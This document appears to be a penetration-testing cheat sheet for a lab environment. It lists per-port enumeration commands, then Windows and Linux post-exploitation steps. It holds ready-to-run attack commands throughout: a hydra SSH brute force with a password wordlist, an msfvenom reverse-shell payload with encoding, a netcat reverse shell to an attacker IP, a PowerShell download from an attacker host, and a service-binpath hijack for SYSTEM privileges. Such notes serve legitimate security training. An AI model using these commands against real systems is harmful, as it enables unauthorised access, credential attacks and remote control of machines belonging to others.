# Initial Reconnaissance:
Main Nmap Scan: nmap -v -A -sS 10.11.1.X

Alternate Connect Scan: nmap -v -sT -p 0-10000 10.11.1.X

# Ports and Services:
## 21: FTP
		
Methods:

Service version research

Google / ExploitDB from nmap scan

netcat/telnet interaction

nmap NSE FTP scripts

dotdotpwn


Commands:

nc 10.11.1.X 21  Commands: https://www.serv-u.com/features/file-transfer-protocol-server-linux/commands 

nmap -v 10.11.1.X --script “ftp*”

dotdotpwn -h 10.11.1.X -m ftp

## 22: SSH

Methods:

Service version research

ExploitDB/Google

hydra

Commands:

Hydra -l user -P /usr/share/wordlists/rockyou.gz 10.11.1.X SSH


## 25: SMTP

Methods:

Service version research

ExploitDB/Google

Nmap NSE scripts

smtp-user-enum


Commands:

nmap -v 10.11.1.X --script “smtp*”

smtp-user-enum -u username -U usernamelist.txt -t 10.11.1.X


## 53: DNS
	
Methods:

Service version research

ExploitDB/Google

Nmap NSE scripts

DNSenum


Commands:

nmap -v 10.11.1.X --script “dns*”

dnsenum URL.com


## 80/443/8080: HTTP/HTTPS

Methods:

Service version research

ExploitDB/Google

Nmap NSE scripts

Dirbuster

Web Browser (Iceweasel)

Nikto

Burpsuite

Cadaver/davtest

WPscan


Commands:

nmap -v 10.11.1.X --script “http*”

Nikto -h 10.11.1.X


## 110: POP3
	
Methods:

Service version research

ExploitDB/Google

Nmap NSE scripts

Netcat/telnet manual interaction


Commands:

nmap -v 10.11.1.X --script “pop*”

nc 10.11.1.X 110


## 135: RPC
	
Methods:

Service version research

ExploitDB/Google

Nmap NSE scripts

enum4linux

rpcclient


Commands:

nmap -v 10.11.1.X --script “rpc*”

enum4linux 10.11.1.X

rpcclient -U “” 10.11.1.X for null session

	
## 139: NETBIOS
	
Methods:

Service version research

ExploitDB/Google

nbtscan

enum4linux


Commands:

nbtscan -v 10.11.1.X

enum4linux 10.11.1.X


## 445: SMB
	
Methods:

Service version research

ExploitDB/Google

Nmap NSE scripts

enum4linux

smbclient

smbmap

nbtscan


Commands:

nmap -v 10.11.1.X --script “smb*”

enum4linux 10.11.1.X

smbclient "//10.11.1.128/wwwroot" - Connects to smb shares mapped with enum4linux

smbmap -u jsmith -p password1 -d workgroup -H 192.168.0.1

nbtscan -v 10.11.1.X




# Windows Post-Exploitation
	
Powershell File Download: \
*powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.243/test.txt','C:\test.txt)”*

General File Transfer: https://blog.ropnop.com/transferring-files-from-kali-to-windows/ 

Mingw Compiling for Windows: *i686-w64-mingw32-g++ -o evil.exe 37098.txt -lws2_32*

Dos2unix (Gets rid of /bin/sh^5 error): *dos2unix <filename>* 
	
Payload Encoding: msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.243 LPORT=1777 -f exe -o rever.exe -e x86/shikata_ga_nai -k

Windows netcat reverse shell: nc.exe 192.168.100.113 4444 –e cmd.exe


## Privilege Escalation
	

General Guide: http://www.fuzzysecurity.com/tutorials/16.html 

Accesschk.exe: https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk 

Windows Enum: https://github.com/azmatt/windowsEnum 

WinExpSugg: https://github.com/GDSSecurity/Windows-Exploit-Suggester 

WinPrivChk: https://github.com/pentestmonkey/windows-privesc-check 
\
\
\
**Common Service Windows Privesc:**

*sc config SSDPSRV start= “auto”*\
*net start SSDPSRV*\
*net start UPNPHOST*\
*sc config upnphost binpath= “C:\shell.exe”*\
*sc config upnphost obj= “.\LocalSystem” password= “”*\
*net start upnphost*
\
\
\
# Linux Post-Exploitation

Shell Cheatsheet: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet 

Shell Escape: python -c 'import pty; pty.spawn("/bin/sh")'  

File Transfer: https://www.pks.mpg.de/~mueller/docs/suse10.2/html/opensuse-manual_en/manual/sec.filetrans.copy.html 


## Privilege Escalation:


General Guide: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
Exploit Suggester: https://github.com/mzet-/linux-exploit-suggester 
LinEnum: https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh 
Unix Privesc Check: https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/upc.sh 
LinPrivChecker: https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py

	
	
	

